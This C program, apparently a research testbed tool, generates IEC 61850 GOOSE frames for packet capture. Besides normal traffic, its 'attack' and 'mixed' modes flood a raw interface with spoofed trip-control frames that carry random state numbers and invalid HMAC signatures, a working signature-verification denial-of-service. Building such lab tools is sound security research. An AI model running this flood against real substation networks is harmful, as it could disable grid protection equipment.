/*
 * goose_pcap_gen.c — GOOSE Frame Generator for PCAP Capture
 *
 * Generates real IEC 61850 GOOSE frames (EtherType 0x88B8) on a
 * specified interface. Produces both legitimate and CIL-DoS attack
 * frames for Wireshark analysis and evidence collection.
 *
 * Build:  gcc -O2 -o goose_pcap_gen goose_pcap_gen.c
 * Run:    sudo ./goose_pcap_gen <interface> <mode> [rate] [count]
 *
 * Modes:
 *   legit    — Normal GOOSE traffic (1 pps, incrementing stNum)
 *   attack   — CIL-DoS flood (configurable rate, random stNum)
 *   mixed    — Both legitimate + attack traffic interleaved
 *
 * Capture:  sudo tcpdump -i goose-br -w capture.pcap ether proto 0x88b8
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <arpa/inet.h>

#define GOOSE_ETHERTYPE 0x88B8
#define MAX_FRAME_SIZE 512

/* GOOSE multicast destination (01:0c:cd:01:00:00) per IEC 61850-8-1 */
static const unsigned char GOOSE_DST_MAC[6] = {0x01, 0x0c, 0xcd, 0x01, 0x00, 0x00};
static const unsigned char LEGIT_SRC_MAC[6] = {0x08, 0x00, 0x27, 0x10, 0x20, 0x01};
static const unsigned char ATTACK_SRC_MAC[6] = {0xde, 0xad, 0xbe, 0xef, 0x00, 0x01};

/* BER-TLV helpers */
static int ber_put_tag_len(unsigned char *buf, unsigned char tag,
                           int len) {
    int pos = 0;
    buf[pos++] = tag;
    if (len < 0x80) {
        buf[pos++] = (unsigned char)len;
    } else if (len < 0x100) {
        buf[pos++] = 0x81;
        buf[pos++] = (unsigned char)len;
    } else {
        buf[pos++] = 0x82;
        buf[pos++] = (unsigned char)(len >> 8);
        buf[pos++] = (unsigned char)(len & 0xFF);
    }
    return pos;
}

static int ber_put_int(unsigned char *buf, unsigned char tag, uint32_t val) {
    int pos = 0;
    unsigned char vbuf[4];
    int vlen;
    if (val < 0x80) { vlen = 1; vbuf[0] = val; }
    else if (val < 0x8000) { vlen = 2; vbuf[0] = val >> 8; vbuf[1] = val & 0xFF; }
    else if (val < 0x800000) { vlen = 3; vbuf[0] = val >> 16; vbuf[1] = (val >> 8) & 0xFF; vbuf[2] = val & 0xFF; }
    else { vlen = 4; vbuf[0] = val >> 24; vbuf[1] = (val >> 16) & 0xFF; vbuf[2] = (val >> 8) & 0xFF; vbuf[3] = val & 0xFF; }
    pos += ber_put_tag_len(buf + pos, tag, vlen);
    memcpy(buf + pos, vbuf, vlen);
    return pos + vlen;
}

static int ber_put_str(unsigned char *buf, unsigned char tag,
                       const char *str) {
    int slen = strlen(str);
    int pos = ber_put_tag_len(buf, tag, slen);
    memcpy(buf + pos, str, slen);
    return pos + slen;
}

static int ber_put_bool(unsigned char *buf, unsigned char tag, int val) {
    buf[0] = tag; buf[1] = 1; buf[2] = val ? 0xFF : 0x00;
    return 3;
}

/*
 * Build a GOOSE frame following IEC 61850-8-1 / IEC 62351-6 structure.
 * Returns total frame length.
 */
static int build_goose_frame(unsigned char *frame, const unsigned char *src_mac,
                             const char *gocb_ref, uint32_t st_num,
                             uint32_t sq_num, uint32_t conf_rev,
                             int is_attack) {
    int pos = 0;

    /* Ethernet header */
    memcpy(frame + pos, GOOSE_DST_MAC, 6); pos += 6;
    memcpy(frame + pos, src_mac, 6);       pos += 6;
    frame[pos++] = (GOOSE_ETHERTYPE >> 8) & 0xFF;
    frame[pos++] = GOOSE_ETHERTYPE & 0xFF;

    /* GOOSE header: APPID(2) + Length(2) + Reserved1(2) + Reserved2(2) */
    int goose_hdr_start = pos;
    frame[pos++] = 0x00; frame[pos++] = 0x01; /* APPID = 0x0001 */
    int len_pos = pos;
    frame[pos++] = 0x00; frame[pos++] = 0x00; /* Length placeholder */
    frame[pos++] = 0x00; frame[pos++] = 0x00; /* Reserved1 */
    frame[pos++] = 0x00; frame[pos++] = 0x00; /* Reserved2 */

    /* GOOSE PDU (ASN.1 BER, tag 0x61) */
    unsigned char pdu[256];
    int plen = 0;

    /* gocbRef (tag 0x80) */
    plen += ber_put_str(pdu + plen, 0x80, gocb_ref);
    /* timeAllowedtoLive (tag 0x81) — 2000 ms */
    plen += ber_put_int(pdu + plen, 0x81, 2000);
    /* datSet (tag 0x82) */
    plen += ber_put_str(pdu + plen, 0x82, "SubstationA/LLN0$DataSet1");
    /* stNum (tag 0x83) */
    plen += ber_put_int(pdu + plen, 0x83, st_num);
    /* sqNum (tag 0x84) */
    plen += ber_put_int(pdu + plen, 0x84, sq_num);
    /* confRev (tag 0x85) */
    plen += ber_put_int(pdu + plen, 0x85, conf_rev);
    /* ndsCom (tag 0x86) — false */
    plen += ber_put_bool(pdu + plen, 0x86, 0);
    /* numDatSetEntries (tag 0x8A) */
    plen += ber_put_int(pdu + plen, 0x8A, 1);

    /* IEC 62351-6 security extension (tag 0xAF) */
    unsigned char sec[40];
    int slen = 0;
    /* algorithm (tag 0x80) — 1 = HMAC-SHA-256 */
    slen += ber_put_int(sec + slen, 0x80, 1);
    /* signature (tag 0x81) — 32 bytes */
    sec[slen++] = 0x81;
    sec[slen++] = 32;
    if (is_attack) {
        /* Invalid signature: random garbage */
        for (int i = 0; i < 32; i++)
            sec[slen++] = (unsigned char)(rand() & 0xFF);
    } else {
        /* Simulated valid signature (all 0xAA for demo) */
        memset(sec + slen, 0xAA, 32);
        slen += 32;
    }

    /* Wrap security in 0xAF */
    int sec_wrapped_len = ber_put_tag_len(pdu + plen, 0xAF, slen);
    memcpy(pdu + plen + sec_wrapped_len, sec, slen);
    plen += sec_wrapped_len + slen;

    /* Wrap PDU in sequence tag 0x61 */
    int seq_hdr = ber_put_tag_len(frame + pos, 0x61, plen);
    pos += seq_hdr;
    memcpy(frame + pos, pdu, plen);
    pos += plen;

    /* Fill in GOOSE length */
    uint16_t goose_len = pos - goose_hdr_start;
    frame[len_pos] = (goose_len >> 8) & 0xFF;
    frame[len_pos + 1] = goose_len & 0xFF;

    /* Pad to minimum Ethernet frame size (64 bytes) */
    if (pos < 64) {
        memset(frame + pos, 0, 64 - pos);
        pos = 64;
    }

    return pos;
}

static int open_raw_socket(const char *ifname) {
    int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (fd < 0) { perror("socket"); return -1; }

    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);
    if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0) {
        perror("ioctl SIOCGIFINDEX");
        close(fd);
        return -1;
    }

    struct sockaddr_ll sll;
    memset(&sll, 0, sizeof(sll));
    sll.sll_family = AF_PACKET;
    sll.sll_ifindex = ifr.ifr_ifindex;
    sll.sll_protocol = htons(ETH_P_ALL);
    if (bind(fd, (struct sockaddr *)&sll, sizeof(sll)) < 0) {
        perror("bind");
        close(fd);
        return -1;
    }

    return fd;
}

static void usage(const char *prog) {
    fprintf(stderr,
        "Usage: %s <interface> <mode> [rate_pps] [count]\n"
        "\n"
        "Modes:\n"
        "  legit   — Normal GOOSE (1 pps, incrementing stNum)\n"
        "  attack  — CIL-DoS flood (default: 10000 pps)\n"
        "  mixed   — Both legitimate + attack interleaved\n"
        "\n"
        "Examples:\n"
        "  sudo %s veth-pub legit 1 100\n"
        "  sudo %s veth-pub attack 50000 500000\n"
        "  sudo %s veth-pub mixed 10000 100000\n"
        "\n"
        "Capture: sudo tcpdump -i goose-br -w goose.pcap ether proto 0x88b8\n",
        prog, prog, prog, prog);
}

int main(int argc, char **argv) {
    if (argc < 3) { usage(argv[0]); return 1; }

    const char *ifname = argv[1];
    const char *mode = argv[2];
    int rate = 1;
    int count = 100;

    if (strcmp(mode, "attack") == 0) rate = 10000;
    else if (strcmp(mode, "mixed") == 0) rate = 10000;

    if (argc > 3) rate = atoi(argv[3]);
    if (argc > 4) count = atoi(argv[4]);

    int fd = open_raw_socket(ifname);
    if (fd < 0) return 1;

    srand(time(NULL));

    fprintf(stderr,
        "GridPulse GOOSE Generator\n"
        "  Interface: %s\n"
        "  Mode:      %s\n"
        "  Rate:      %d pps\n"
        "  Count:     %d frames\n"
        "  Capture:   sudo tcpdump -i goose-br -w goose.pcap ether proto 0x88b8\n\n",
        ifname, mode, rate, count);

    unsigned char frame[MAX_FRAME_SIZE];
    uint32_t st_num = 1;
    uint32_t sq_num = 0;
    int sent = 0;
    int legit_sent = 0;
    int attack_sent = 0;

    struct timespec interval;
    long ns_per_pkt = (rate > 0) ? (1000000000L / rate) : 1000000000L;
    interval.tv_sec = ns_per_pkt / 1000000000L;
    interval.tv_nsec = ns_per_pkt % 1000000000L;

    struct timespec start, now;
    clock_gettime(CLOCK_MONOTONIC, &start);

    for (int i = 0; i < count; i++) {
        int is_attack_frame;
        const unsigned char *src;
        const char *gocb;

        if (strcmp(mode, "legit") == 0) {
            is_attack_frame = 0;
            src = LEGIT_SRC_MAC;
            gocb = "SubstationA/LLN0$GO$gcbTrip";
            sq_num++;
            if (sq_num % 10 == 0) { st_num++; sq_num = 0; }
        } else if (strcmp(mode, "attack") == 0) {
            is_attack_frame = 1;
            src = ATTACK_SRC_MAC;
            gocb = "SubstationA/LLN0$GO$gcbTrip";
            st_num = rand() % 65535;
            sq_num = 0;
        } else {
            /* mixed: 1 legit per 100 attack */
            if (i % 100 == 0) {
                is_attack_frame = 0;
                src = LEGIT_SRC_MAC;
                gocb = "SubstationA/LLN0$GO$gcbTrip";
                st_num = legit_sent + 1;
                sq_num = 0;
            } else {
                is_attack_frame = 1;
                src = ATTACK_SRC_MAC;
                gocb = "SubstationA/LLN0$GO$gcbTrip";
                st_num = rand() % 65535;
                sq_num = 0;
            }
        }

        int flen = build_goose_frame(frame, src, gocb, st_num, sq_num,
                                     1, is_attack_frame);

        ssize_t n = write(fd, frame, flen);
        if (n < 0) {
            if (errno == ENOBUFS) { usleep(100); i--; continue; }
            perror("write");
            break;
        }

        sent++;
        if (is_attack_frame) attack_sent++;
        else legit_sent++;

        /* Progress every 10k frames */
        if (sent % 10000 == 0) {
            clock_gettime(CLOCK_MONOTONIC, &now);
            double elapsed = (now.tv_sec - start.tv_sec) +
                             (now.tv_nsec - start.tv_nsec) / 1e9;
            fprintf(stderr, "  Sent %d/%d (%.0f pps) legit=%d attack=%d\n",
                    sent, count, sent / elapsed, legit_sent, attack_sent);
        }

        nanosleep(&interval, NULL);
    }

    clock_gettime(CLOCK_MONOTONIC, &now);
    double elapsed = (now.tv_sec - start.tv_sec) +
                     (now.tv_nsec - start.tv_nsec) / 1e9;

    fprintf(stderr,
        "\nDone.\n"
        "  Total sent:  %d frames (%.1f seconds)\n"
        "  Legitimate:  %d\n"
        "  Attack:      %d\n"
        "  Avg rate:    %.0f pps\n",
        sent, elapsed, legit_sent, attack_sent, sent / elapsed);

    close(fd);
    return 0;
}
